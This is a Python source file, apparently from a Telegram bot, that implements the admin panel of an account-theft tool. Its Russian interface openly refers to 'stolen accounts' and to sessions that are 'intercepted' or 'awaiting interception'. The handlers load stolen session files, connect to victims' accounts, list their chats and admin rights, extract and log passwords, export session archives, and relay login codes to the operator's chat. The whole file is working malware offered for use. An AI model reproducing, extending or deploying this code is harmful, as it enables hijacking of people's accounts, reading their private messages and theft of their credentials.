from tgbot.dialogs.dialog import dialog, migrate
from tgbot.keyboards.keyboard import keyboard
from tgbot.services.get_text import gText
from tgbot.services.Session import ImportSession

from tgbot.states.State import State
from tgbot.services.Log import Log

import phonenumbers
from phonenumbers.phonenumberutil import (
    region_code_for_country_code,
)


async def menu(message, state, repo, edit):
	title = "⚙️ Панель админа"
	text = [
		"Здесь вы можете отследить всю статистику бота, просмотреть украденные аккаунты и много другое.\n",
		"<b>👤 Аккаунты</> - вывести весь список доступных аккаунтов",
		"<b>🔍 Чекнуть</> - чекнуть определенный акк, поиск по ID или номеру",
		"<b>📈 Статистика</> - общая статистика",
		"<b>📤 Экспорт</> - получить архив сессий"
	]
	await state.update_data(page=1)

	markup = await keyboard.admin.main()
	await dialog(message, edit=edit, text=text, markup=markup, title=title)


async def accs(message, state, repo, edit):
	title = "👤 Аккаунты"
	accs = await repo.list_users_of_sessions()
	text = [
		"Здесь выведен список всех доступных аккаунтов.",
		f"👉 Доступно: <b>{len(accs)}</>\n"
		"✅ - успешный выход из всех сессий",
		"❗️ - ожидает выхода из всех сессий"
	]

	markup = await keyboard.admin.accs(accs, state)
	await dialog(message, edit=True, text=text, markup=markup, title=title)


async def open_acc(message, state, repo, edit):
	select_user = (await state.get_data())['_select']
	
	await repo.del_sign_in(select_user)
	client = ImportSession().inject(select_user)

	await client.client.connect()
	user = await client.check_dialogs(message.bot.config)

	if not user:
		title = '❗️Произошла какая-то ошибка'
		text = [
			'Произошла ошибка при обращении к данному аккаунту, возможно сессия невалидна или аккаунт был заблокирован.\n',
			'<b>Хотите ли Вы удалить все записанные данные об этом аккаунте?</>'
		]
		markup = await keyboard.admin.delete_acc(select_user)
	else:
		region = phonenumbers.parse('+' + str(client.meta['phone'].replace('+', '')))
		ses = (await repo.get_user(user['user'].id))['reset_auth']
		ses = "Перехвачена ✅" if ses else "Ожидает перехвата ❗️"
		title = f"👤 Аккаунт {client.meta['user_id']}"
		text = [
			f"📌 Сессия: <b>{ses}</>\n",
			f"👤 ID: <code>{user['user'].id}</>",
			f"🔹 Username: <b>{user['user'].username}</>",
			f"📲 Номер: <b>{client.meta['phone']}</>",
			f"💡 Страна: <b>{region_code_for_country_code(region.country_code)}</>",
			f"⭐️ Премиум: <b>{user['user'].is_premium}</>",
			f"❗️ Скам: <b>{user['user'].is_scam}</>"
		]

		text.append("\n👇 <b> Диалоги 👇</>\n")
		for i in ['channel', 'bot', 'private', 'group', 'supergroup']:
			if not i in user.keys():
				continue
			count = user[i]
			txt = {'channel': '🔔 Каналы', 'bot': '🤖 Боты', 'private': '💬 Личные', 'group': '👤 Группы', 'supergroup': '👥 Супергруппы'}[i]
			text.append(f'{txt}: <b>{count}</b>')

		text.append(f"\n👉 Сообщения в избранном: <b>{user['me']}</>")
		text.append(f"👉 Админ-права: <b>{user['is_creator']}</> (избранное учитывается)\n")

		if user['find'] != '':
			text.append(f"🔍 <b>Найденные диалоги:</b> {user['find']}")
		await client.client.disconnect()
		markup = await keyboard.admin.select(select_user)

	#markup = await keyboard.admin.accs(accs, state)
	await dialog(message, edit=True, text=text, markup=markup, title=title)
	

async def delete_acc(message, state, repo, edit):
	select_user = (await state.get_data())['_select']
	await repo.delete_user_of_phone(select_user)
	await State.admin.accs.set()
	await migrate(
		message=message,
		state=state,
		repo=repo,
		edit=True
	)


async def acc_check_pass(message, state, repo, edit):
	await message.delete()
	select_user = (await state.get_data())['_select']
	client = ImportSession().inject(select_user)
	await client.client.connect()
	await Log(message).passwords(await client.check_passwords())
	await client.client.disconnect()

	await State.admin.open_acc.set()
	await migrate(
		message=message,
		state=state,
		repo=repo,
		edit=False
	)


async def acc_sign_in(message, state, repo, edit):
	await message.delete()
	select_user = (await state.get_data())['_select']
	client = ImportSession().inject(select_user)
	await client.client.connect()
	count = await client.get_support()
	await client.client.disconnect()
	await repo.sign_in(select_user, count)
	title = '📲 Вход в аккаунт'
	text = [
		f"Введите номер <code>{select_user}</> и ждите код для входа в аккаунт, который придет в этот чат."
	]
	markup = await keyboard.admin.back_to_open_acc()
	await dialog(message, edit=True, text=text, markup=markup, title=title)


async def dialog_admin(state, message, current_state, repo, edit: bool=True):
	if current_state == State.admin.main.state:
		await menu(message, state, repo, edit)
	elif current_state == State.admin.accs.state:
		await accs(message, state, repo, edit)
	elif current_state == State.admin.open_acc.state:
		await open_acc(message, state, repo, edit)
	elif current_state == State.admin.delete_acc.state:
		await delete_acc(message, state, repo, edit)

	elif current_state == State.admin.acc_check_pass.state:
		await acc_check_pass(message, state, repo, edit)
	elif current_state == State.admin.acc_sign_in.state:
		await acc_sign_in(message, state, repo, edit)

	
